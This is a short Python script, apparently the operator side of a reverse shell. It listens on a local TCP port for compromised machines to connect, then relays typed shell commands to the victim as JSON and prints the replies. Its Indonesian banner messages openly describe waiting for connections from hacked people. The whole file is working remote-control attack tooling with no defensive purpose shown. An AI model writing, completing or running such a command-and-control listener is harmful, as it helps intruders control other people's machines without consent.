import socket
import termcolor
import json


def kampret_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def kampret_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_koneksi():
    while True:
        command = input('* b4LtH4Z4R_ARMv8-Shell~%s: ' % str(ip))
        kampret_send(command)
        if command == 'bijipeler':
            break
        result = kampret_recv()
        print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 8080))
print(termcolor.colored('[+] Waiting Koneksi Hasil Ngembat Orang!!', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target Konek dari IP:' + str(ip) , 'green'))
target_koneksi()
